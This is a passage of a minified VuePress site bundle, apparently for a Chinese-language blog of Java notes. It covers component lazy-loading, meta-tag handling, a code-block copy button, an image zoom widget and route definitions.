t.e(21).then(t.bind(null,497))},"v-5ae2093a":function(){return t.e(22).then(t.bind(null,498))},"v-c1fddfba":function(){return t.e(24).then(t.bind(null,499))},"v-585fb790":function(){return t.e(19).then(t.bind(null,500))},"v-747c7e31":function(){return t.e(25).then(t.bind(null,501))},"v-1b2fbd05":function(){return t.e(23).then(t.bind(null,502))},"v-394fe5d6":function(){return t.e(26).then(t.bind(null,503))},"v-ff2741c6":function(){return t.e(27).then(t.bind(null,504))},"v-5cc7fa15":function(){return t.e(28).then(t.bind(null,505))},"v-6ae9c5a4":function(){return t.e(30).then(t.bind(null,506))},"v-7ee2cada":function(){return t.e(29).then(t.bind(null,507))},"v-e7b7c32a":function(){return t.e(31).then(t.bind(null,508))},"v-9905be46":function(){return t.e(32).then(t.bind(null,509))},"v-808a2772":function(){return t.e(33).then(t.bind(null,510))},"v-3002ba14":function(){return t.e(34).then(t.bind(null,511))},"v-02fdbe47":function(){return t.e(37).then(t.bind(null,512))},"v-23c6095a":function(){return t.e(35).then(t.bind(null,513))},"v-1527c6e0":function(){return t.e(36).then(t.bind(null,514))},"v-07e31ee4":function(){return t.e(38).then(t.bind(null,515))},"v-d16f8084":function(){return t.e(40).then(t.bind(null,516))},"v-2c7a2efa":function(){return t.e(39).then(t.bind(null,517))},"v-6b4bcf80":function(){return t.e(41).then(t.bind(null,518))},"v-1acf6d1d":function(){return t.e(42).then(t.bind(null,519))},"v-63ccbaf9":function(){return t.e(43).then(t.bind(null,520))},"v-25d7f92e":function(){return t.e(44).then(t.bind(null,521))},"v-7bea548f":function(){return t.e(45).then(t.bind(null,522))},"v-f97f0090":function(){return t.e(46).then(t.bind(null,523))},"v-0e7babe4":function(){return t.e(47).then(t.bind(null,524))},"v-5ad0f62c":function(){return t.e(48).then(t.bind(null,525))},"v-4542ff7e":function(){return t.e(49).then(t.bind(null,526))},"v-3ef166c4":function(){return t.e(50).then(t.bind(null,527))},"v-3d328794":function(){return t.e(51).then(t.bind(null,528))},"v-38452f23":function(){return t.e(52).then(t.bind(null,529))},"v-2674598f":function(){return t.e(53).then(t.bind(null,530))},"v-72fa657c":function(){return t.e(55).then(t.bind(null,531))},"v-4b5e3128":function(){return t.e(54).then(t.bind(null,532))},"v-dcb32594":function(){return t.e(58).then(t.bind(null,533))},"v-21786cb6":function(){return t.e(56).then(t.bind(null,534))},"v-d6189198":function(){return t.e(57).then(t.bind(null,535))},"v-082b0d2c":function(){return t.e(59).then(t.bind(null,536))},"v-eca50964":function(){return t.e(60).then(t.bind(null,537))},"v-5ff80878":function(){return t.e(62).then(t.bind(null,538))},"v-5c71f4fa":function(){return t.e(61).then(t.bind(null,539))},"v-146c1cb3":function(){return t.e(64).then(t.bind(null,540))},"v-315575a6":function(){return t.e(63).then(t.bind(null,541))},"v-727d91d9":function(){return t.e(65).then(t.bind(null,542))},"v-44194b63":function(){return t.e(66).then(t.bind(null,543))},"v-5b4e4ae2":function(){return t.e(67).then(t.bind(null,544))},"v-e5da1462":function(){return t.e(68).then(t.bind(null,545))},"v-4fb47c6c":function(){return t.e(69).then(t.bind(null,546))},"v-1b92a67a":function(){return t.e(70).then(t.bind(null,547))},"v-a652ea48":function(){return t.e(71).then(t.bind(null,548))},"v-8194159c":function(){return t.e(73).then(t.bind(null,549))},"v-4993606a":function(){return t.e(72).then(t.bind(null,550))},"v-066dd738":function(){return t.e(74).then(t.bind(null,551))},"v-4fbe8f80":function(){return t.e(75).then(t.bind(null,552))},"v-008f5f06":function(){return t.e(76).then(t.bind(null,553))},"v-827e00c2":function(){return t.e(77).then(t.bind(null,554))},"v-775a7bcf":function(){return t.e(80).then(t.bind(null,555))},"v-5108785a":function(){return t.e(79).then(t.bind(null,556))},"v-52c117a4":function(){return t.e(78).then(t.bind(null,557))},"v-5e7029de":function(){return t.e(81).then(t.bind(null,558))},"v-d0de8634":function(){return t.e(82).then(t.bind(null,559))},"v-909b2404":function(){return t.e(83).then(t.bind(null,560))},"v-64e25eba":function(){return t.e(84).then(t.bind(null,561))},"v-4e70a85e":function(){return t.e(85).then(t.bind(null,562))},"v-7d0dc8ff":function(){return t.e(87).then(t.bind(null,563))},"v-2ae3d180":function(){return t.e(86).then(t.bind(null,564))},"v-2df2013e":function(){return t.e(88).then(t.bind(null,565))},"v-f2dce1b0":function(){return t.e(89).then(t.bind(null,566))},"v-966f9b00":function(){return t.e(90).then(t.bind(null,567))},"v-212cb943":function(){return t.e(91).then(t.bind(null,568))},"v-80701660":function(){return t.e(92).then(t.bind(null,569))},"v-1cf8c197":function(){return t.e(93).then(t.bind(null,570))},"v-be3913a8":function(){return t.e(94).then(t.bind(null,571))},"v-589af7a8":function(){return t.e(95).then(t.bind(null,572))},"v-c4504aa6":function(){return t.e(96).then(t.bind(null,573))},"v-1bd8b602":function(){return t.e(97).then(t.bind(null,574))},"v-4af5aed9":function(){return t.e(98).then(t.bind(null,575))},"v-145b2bd8":function(){return t.e(100).then(t.bind(null,576))},"v-3701b2bc":function(){return t.e(99).then(t.bind(null,577))},"v-2715e687":function(){return t.e(101).then(t.bind(null,578))},"v-3a5a1361":function(){return t.e(102).then(t.bind(null,579))},"v-40ab9df5":function(){return t.e(103).then(t.bind(null,580))},"v-59de6d20":function(){return t.e(104).then(t.bind(null,581))}};function Ci(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var Pi=/-(\w)/g,Ri=Ci((function(n){return n.replace(Pi,(function(n,e){return e?e.toUpperCase():""}))})),Bi=/\B([A-Z])/g,Oi=Ci((function(n){return n.replace(Bi,"-$1").toLowerCase()})),zi=Ci((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function Mi(n,e){if(e)return n(e)?n(e):e.includes("-")?n(zi(Ri(e))):n(zi(e))||n(Oi(e))}var Li=Object.assign({},_i,Ii),Di=function(n){return Li[n]},Ni=function(n){return Ii[n]},qi=function(n){return _i[n]},Fi=function(n){return Ba.component(n)};function $i(n){return Mi(Ni,n)}function Ui(n){return Mi(qi,n)}function Gi(n){return Mi(Di,n)}function Ji(n){return Mi(Fi,n)}function Vi(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(Ji(e)||!Gi(e)){n.next=5;break}return n.next=3,Gi(e)();case 3:t=n.sent,Ba.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function Hi(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var Ki=t(50),Wi=(t(274),t(156),t(51),t(221)),Xi=t.n(Wi),Yi=t(222),Qi=t.n(Yi),Zi={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(Ki.a)(n,1)[0]})).map((function(n){var e=Object(Ki.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(Qi()(n[t]),'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=es(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Ti.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=ts(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return Xi()([{name:"description",content:this.$description}],n,this.siteMeta,rs)},updateCanonicalLink:function(){ns(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",es(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){ts(null,this.currentMetaTags),ns()}};function ns(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function es(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function ts(n,e){if(e&&Object(Ti.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function rs(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(149);var as=t(157),os={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(as)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),o=window.innerHeight+r,i=0;i<t.length;i++){var s=t[i],l=t[i+1],c=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!l||r<l.parentElement.offsetTop-10),p=decodeURIComponent(this.$route.hash);if(c&&p!==decodeURIComponent(s.hash)){var d=s;if(o===a)for(var u=i+1;u<t.length;u++)if(p===decodeURIComponent(t[u].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(d.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},is=(t(58),t(109)),ss=t.n(is),ls={mounted:function(){var n=this;ss.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||Ba.component(n.name)||ss.a.start(),t()})),this.$router.afterEach((function(){ss.a.done(),n.isSidebarOpen=!1}))}};t(80),t(110),t(83),t(369);function cs(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(105);function ps(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function ds(n,e,t){return e&&ps(n.prototype,e),t&&ps(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}t(370);var us=function(){function n(){cs(this,n);this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}return ds(n,[{key:"show",value:function(n){var e=this,t=n.text,r=void 0===t?"":t,a=n.duration,o=void 0===a?3e3:a,i=document.createElement("div");i.className="message move-in",i.innerHTML='\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">'.concat(r,"</div>\n    "),this.containerEl.appendChild(i),o>0&&setTimeout((function(){e.close(i)}),o)}},{key:"close",value:function(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",(function(){n.remove()}))}}]),n}(),ms={mounted:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy:function(){var n=this;setTimeout((function(){(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach((function(e){document.querySelectorAll(e).forEach(n.generateCopyButton)}))}),1e3)},generateCopyButton:function(n){var e=this;if(!n.classList.contains("codecopy-enabled")){var t=document.createElement("i");t.className="code-copy",t.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',t.title="Copy to clipboard",t.addEventListener("click",(function(){e.copyToClipboard(n.innerText)})),n.appendChild(t),n.classList.add("codecopy-enabled")}},copyToClipboard:function(n){var e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);var t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy"),(new us).show({text:"复制成功",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}},gs=(t(79),"auto"),fs="zoom-in",hs="zoom-out",bs="grab",vs="move";function ys(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],a={passive:!1};r?n.addEventListener(e,t,a):n.removeEventListener(e,t,a)}function ks(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function xs(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function ws(n,e,t){!function(n){var e=Ss,t=js;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var a=n.transform;delete n.transform,n[t]=a}}(e);var r=n.style,a={};for(var o in e)t&&(a[o]=r[o]||""),r[o]=e[o];return a}var Ss="transition",js="transform",Es="transform",As="transitionend";var Ts=function(){},_s={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Ts,onClose:Ts,onGrab:Ts,onMove:Ts,onRelease:Ts,onBeforeOpen:Ts,onBeforeClose:Ts,onBeforeGrab:Ts,onBeforeRelease:Ts,onImageLoading:Ts,onImageLoaded:Ts},Is={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),Ps(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,a=this.lastScrollPosition.y-t,o=this.options.scrollThreshold;(Math.abs(a)>=o||Math.abs(r)>=o)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(Cs(n)&&!Ps(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){Cs(n)&&!Ps(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function Cs(n){return 0===n.button}function Ps(n){return n.metaKey||n.ctrlKey}var Rs={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,ws(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),ys(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){ws(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},Bs="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Os=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),zs=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Ms={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=xs(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,a=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?bs:hs,transition:Es+"\n        "+r+"s\n        "+a,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=ws(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,ws(this.el,{transform:"none"})},grab:function(n,e,t){var r=Ls(),a=r.x-n,o=r.y-e;ws(this.el,{cursor:vs,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=Ls(),a=r.x-n,o=r.y-e;ws(this.el,{transition:Es,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){ws(this.el,this.styleClose)},restoreOpenStyle:function(){ws(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=Ls(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,a=r.customSize,o=r.scaleBase;if(!a&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(a&&"object"===(void 0===a?"undefined":Bs(a)))return{x:a.width/this.rect.width,y:a.height/this.rect.height};var i=this.rect.width/2,s=this.rect.height/2,l=Ls(),c={x:l.x-i,y:l.y-s},p=c.x/i,d=c.y/s,u=o+Math.min(p,d);if(a&&"string"==typeof a){var m=t||this.el.naturalWidth,g=e||this.el.naturalHeight,f=parseFloat(a)*m/(100*this.rect.width),h=parseFloat(a)*g/(100*this.rect.height);if(u>f||u>h)return{x:f,y:h}}return{x:u,y:u}}};function Ls(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function Ds(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){ys(n,r,e[r],t)}))}var Ns=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(Ms),this.overlay=Object.create(Rs),this.handler=Object.create(Is),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=zs({},_s,e),this.overlay.init(this),this.handler.init(this)}return Os(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=fs,ys(n,"click",this.handler.click),this.options.preloadImage&&ks(xs(n)));return this}},{key:"config",value:function(n){return n?(zs(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var a=this.target.srcOriginal;null!=a&&(this.options.onImageLoading(r),ks(a,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),ys(document,"scroll",this.handler.scroll),ys(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow);var o=function n(){ys(r,As,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&Ds(document,e.handler,!0),t(r)};return ys(r,As,o),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=gs,this.overlay.fadeOut(),this.target.zoomOut(),ys(document,"scroll",this.handler.scroll,!1),ys(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow,!1);var r=function r(){ys(t,As,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&Ds(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return ys(t,As,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var a=this.target.el;this.options.onBeforeGrab(a),this.released=!1,this.target.grab(n,e,t);var o=function n(){ys(a,As,n,!1),r(a)};return ys(a,As,o),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=vs,this.target.move(n,e,t);var a=this.target.el,o=function n(){ys(a,As,n,!1),r(a)};return ys(a,As,o),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=gs,this.target.restoreOpenStyle();var r=function r(){ys(t,As,r,!1),n.lock=!1,n.released=!0,e(t)};return ys(t,As,r),this}}}]),n}(),qs=".theme-vdoing-content img:not(.no-zoom)",Fs=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),$s=Number("500"),Us=function(){function n(){cs(this,n),this.instance=new Ns(Fs)}return ds(n,[{key:"update",value:function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs;"undefined"!=typeof window&&this.instance.listen(n)}},{key:"updateDelay",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:$s;setTimeout((function(){return n.update(e)}),t)}}]),n}(),Gs=[Zi,os,ls,ms,{watch:{"$page.path":function(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted:function(){this.$vuepress.zooming=new Us,this.$vuepress.zooming.updateDelay()}}],Js={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return Hi("layout",n),Ba.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Vs=t(41),Hs=Object(Vs.a)(Js,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Ti.a)(t));break;default:throw new Error("Unknown option name.")}}(Hs,"mixins",Gs);var Ks=[{name:"v-2dd0fd66",path:"/language/java/base/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2dd0fd66").then(t)}},{path:"/language/java/base/1/index.html",redirect:"/language/java/base/1/"},{path:"/00.语言/01.JAVA/01.基础/1.JAVA 锁 及 线程.html",redirect:"/language/java/base/1/"},{name:"v-182bbd6a",path:"/language/java/version/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-182bbd6a").then(t)}},{path:"/language/java/version/1/index.html",redirect:"/language/java/version/1/"},{path:"/00.语言/01.JAVA/03.版本/1.JAVA8 新特性总结.html",redirect:"/language/java/version/1/"},{name:"v-43985582",path:"/language/java/base/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-43985582").then(t)}},{path:"/language/java/base/2/index.html",redirect:"/language/java/base/2/"},{path:"/00.语言/01.JAVA/01.基础/2.JAVA NIO API.html",redirect:"/language/java/base/2/"},{name:"v-26d5b34d",path:"/language/java/jvm/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-26d5b34d").then(t)}},{path:"/language/java/jvm/1/index.html",redirect:"/language/java/jvm/1/"},{path:"/00.语言/01.JAVA/02.JVM/1.JVM模块介绍.html",redirect:"/language/java/jvm/1/"},{name:"v-1177a00b",path:"/language/java/version/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1177a00b").then(t)}},{path:"/language/java/version/2/index.html",redirect:"/language/java/version/2/"},{path:"/00.语言/01.JAVA/03.版本/2.JAVA9 